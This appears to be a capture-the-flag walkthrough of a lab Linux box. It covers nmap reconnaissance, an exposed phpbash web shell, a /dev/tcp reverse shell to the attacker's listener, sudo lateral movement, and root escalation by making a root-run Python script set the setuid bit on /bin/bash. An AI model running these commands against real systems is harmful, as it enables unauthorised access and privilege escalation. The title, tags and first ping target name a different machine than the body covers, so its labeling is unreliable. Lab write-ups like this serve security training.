# Shocker

Apache
Penetration Tester Level 1
Web
Vulnerability Assessment
Outdated Software
Security Tools
Metasploit
Bash
Perl
Reconnaissance
Web Site Structure Discovery
SUDO Exploitation
Remote Code Execution

## Scanning

### Ping

First we ping the machine to check that we have access to it.

```
$ ping 10.10.10.56
PING 10.10.10.56 (10.10.10.56) 56(84) bytes of data.
64 bytes from 10.10.10.56: icmp_seq=1 ttl=63 time=47.0 ms
```

With the ping we can see that we the machine is recheable.
We can have some info about ttl=63.
This ttl means that we are in front of a linux machine (ttl of linux is 64)

### Nmap - Port Discovering

```
$ nmap -p- --min-rate 5000 --open -vvv -Pn -oN nmap.txt 10.10.10.68

# Nmap 7.93 scan initiated Sun Dec 11 07:46:03 2022 as: nmap -p- --min-rate 5000 --open -vvv -Pn -oN nmap.txt 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up, received user-set (0.062s latency).
Scanned at 2022-12-11 07:46:16 EST for 12s
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Dec 11 07:46:28 2022 -- 1 IP address (1 host up) scanned in 24.38 seconds
```

Nmap flags used:
-p- is for the scna of all the tcp ports.
-sS
--min-rate 5000 
--open filter the result to show only opened ports
-vvv
-n don't try to make dns resolve.
-Pn 

Let's check what services are running on port 80 and the version.

```
$ nmap -sCV -p80 10.10.10.68 

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 14:36 EST
Nmap scan report for 10.10.10.68
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.90 seconds
```

It's an apache server. Let's use http-enum script before triying to use fuzzing.

```
$ nmap --script http-enum -p80 10.10.10.68

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 14:42 EST
Nmap scan report for 10.10.10.68
Host is up (0.044s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /uploads/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 20.97 seconds
```

/dev/ directory looks interesting. It has http://10.10.10.68/dev/phpbash.php thats is like a bash.

## Gaining System Access 

http://10.10.10.68/dev/phpbash.php

```
$ whoami
www-data
$ ls /home
arrexel
scriptmanager
$ bash -c "bash -i >& /dev/tcp/10.10.16.4/443 0>&1"
```

This last command was not doing nothing. Let's encode url encode the & character.

```
$ bash -c "bash -i >%26 /dev/tcp/10.10.16.4/443 0>%261"
```
Now it opens a connection with our bash that was listenign gon port 443.

### Upgrade the shell

```
$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.68] 37366
bash: cannot set terminal process group (851): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/var/www/html/dev$ whoami
whoami
www-data
www-data@bashed:/var/www/html/dev$  script /dev/null -c bash
 script /dev/null -c bash
Script started, file is /dev/null
www-data@bashed:/var/www/html/dev$ ^Z
zsh: suspended  nc -nlvp 443
                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/OSCP]
└─$ stty raw -echo; fg  
[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

### Privilege Scalating

Now we are with www-data user. We are searching for root access.

```
$ www-data@bashed:/var/www/html/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ www-data@bashed:/var/www/html/dev$ whoami
www-data
$ www-data@bashed:/var/www/html/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ www-data@bashed:/var/www/html/dev$ cat /home/arrexel/user.txt
flag here.
$ www-data@bashed:/var/www/html/dev$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

With "sudo -l" we see that we can execute anything with scriptmanager user. For example:

```
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager whoami
scriptmanager
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager bash  
scriptmanager@bashed:/var/www/html/dev$ whoami 
scriptmanager
```

This was a lateral moving, to scriptamanger user.
Let`s see what has this user on his home and his last bash commands.

```
$ scriptmanager@bashed:/var/www/html/dev$ cd
$ scriptmanager@bashed:~$ ls
$ scriptmanager@bashed:~$ ls -la
total 28
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 4 root          root          4096 Dec  4  2017 ..
-rw------- 1 scriptmanager scriptmanager    2 Dec  4  2017 .bash_history
-rw-r--r-- 1 scriptmanager scriptmanager  220 Dec  4  2017 .bash_logout
-rw-r--r-- 1 scriptmanager scriptmanager 3786 Dec  4  2017 .bashrc
drwxr-xr-x 2 scriptmanager scriptmanager 4096 Dec  4  2017 .nano
-rw-r--r-- 1 scriptmanager scriptmanager  655 Dec  4  2017 .profile
scriptmanager@bashed:~$ cat .bash_history 
 
$ scriptmanager@bashed:~$ uname -a
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
scriptmanager@bashed:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.2 LTS
Release:        16.04
Codename:       xenial
```

Looks like is nothign interesting here.
Let's try to find any suid privileges for triying to scale privileges.

´´´
$ scriptmanager@bashed:/$ find \-perm -4000 2>/dev/null 
./bin/mount
./bin/fusermount
./bin/su
./bin/umount
./bin/ping6
./bin/ntfs-3g
./bin/ping
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/sudo
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/vmware-user-suid-wrapper
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
´´´

We can't exploit any of this. Let`s search in the root directory.

```
$ scriptmanager@bashed:/$ ls
bin   etc         lib         media  proc  sbin     sys  var
boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv      usr
$ scriptmanager@bashed:/$ cd /root
bash: cd: /root: Permission denied
$ scriptmanager@bashed:/$ cd scripts/
$ scriptmanager@bashed:/scripts$ ls -la   
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Dec 11 12:11 test.txt

$ scriptmanager@bashed:/scripts$ cat test.txt
testing 123!
$ scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Looks like the file test.py that owns scriptmanager user, is generating a file with root privileges. Lets use setuid on /bin/bash so we can then execute the bash as root.
We can see that in the ls -l /bin/bash ,this file changes the first x to an s.

```
scriptmanager@bashed:/scripts$ nano test.py 
import os

os.system("chmod u+s /bin/bash")

scriptmanager@bashed:/scripts$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ bash -p 
bash-4.3# whoami
root
bash-4.3# cat /root/
.bash_history     .nano/            .selected_editor  
.bashrc           .profile          root.txt          
bash-4.3# cat /root/root.txt 
Root flag!
```


